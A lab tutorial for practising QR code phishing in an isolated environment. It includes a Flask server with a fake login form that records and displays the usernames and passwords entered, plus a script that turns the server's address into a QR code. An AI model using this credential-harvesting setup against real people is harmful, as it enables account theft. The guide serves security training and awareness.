# Quishing (QR Code Phishing) Lab Setup

**DISCLAIMER:**  
This lab is for educational purposes only. Do NOT use these techniques outside of a controlled, authorized environment. Always follow ethical guidelines and obtain proper permissions.

---

## Overview

This lab will guide you through setting up a safe, isolated environment to practice and understand QR code phishing (quishing) techniques. You will:
- Set up a local web server to host a fake login page.
- Generate QR codes that point to your phishing page.
- Test the attack using your own devices in a controlled environment.

---

## Prerequisites

- A computer with internet access.
- [Docker](https://www.docker.com/get-started) installed (recommended for isolation).
- [Python 3](https://www.python.org/downloads/) (for a simple web server and QR code generation).
- A smartphone or device with a QR code scanner.

---

## Step 1: Set Up an Isolated Environment

**Option 1: Using Docker (Recommended)**
1. Install Docker.
2. Create a new directory for your lab:
   ```bash
   mkdir quishing-lab && cd quishing-lab
   ```
3. Create a `Dockerfile` with the following content:
   ```Dockerfile
   FROM python:3
   WORKDIR /app
   COPY . /app
   RUN pip install flask qrcode[pil]
   EXPOSE 5000
   CMD ["python", "server.py"]
   ```
4. (You will add `server.py` in the next step.)

**Option 2: Using a Virtual Machine**
- Set up a VM (e.g., with VirtualBox) and install Python 3.

---

## Step 2: Create a Fake Login Page

1. Create a file named `server.py` with the following content:
   ```python
   from flask import Flask, request, render_template_string

   app = Flask(__name__)

   LOGIN_PAGE = '''
   <h2>Login</h2>
   <form method="POST">
     <input name="username" placeholder="Username" required><br>
     <input name="password" type="password" placeholder="Password" required><br>
     <button type="submit">Login</button>
   </form>
   {% if creds %}
   <p style="color:red;">Captured: {{ creds }}</p>
   {% endif %}
   '''

   captured = []

   @app.route('/', methods=['GET', 'POST'])
   def login():
       creds = None
       if request.method == 'POST':
           username = request.form.get('username')
           password = request.form.get('password')
           creds = f"{username}:{password}"
           captured.append(creds)
       return render_template_string(LOGIN_PAGE, creds=creds)

   if __name__ == '__main__':
       app.run(host='0.0.0.0', port=5000)
   ```
2. (Optional) Add HTML/CSS to make the page look more realistic.

---

## Step 3: Build and Run the Lab Server

**If using Docker:**
```bash
docker build -t quishing-lab .
docker run -p 5000:5000 quishing-lab
```

**If using Python directly:**
```bash
pip install flask
python server.py
```

---

## Step 4: Generate a QR Code

1. Create a file named `generate_qr.py`:
   ```python
   import qrcode

   url = "http://<YOUR_LOCAL_IP>:5000/"
   img = qrcode.make(url)
   img.save("phishing_qr.png")
   print("QR code saved as phishing_qr.png")
   ```
2. Replace `<YOUR_LOCAL_IP>` with your computer's local IP address (e.g., 192.168.1.10).
3. Run the script:
   ```bash
   pip install qrcode[pil]
   python generate_qr.py
   ```

---

## Step 5: Test the Attack

1. Open the `phishing_qr.png` file.
2. Use your smartphone to scan the QR code.
3. The browser should open the fake login page.
4. Enter test credentials and observe the captured data on the page.

---

## Step 6: Clean Up

- Stop the Docker container or shut down the VM when done.
- Delete any test data.

---

## Safety & Ethics

- Never use these techniques on real users or systems without explicit permission.
- This lab is for learning and awareness only.

---

## References

- [OWASP QR Code Security](https://owasp.org/www-community/attacks/QR_Code_Attacks)
- [Flask Documentation](https://flask.palletsprojects.com/)
- [qrcode Python Library](https://pypi.org/project/qrcode/)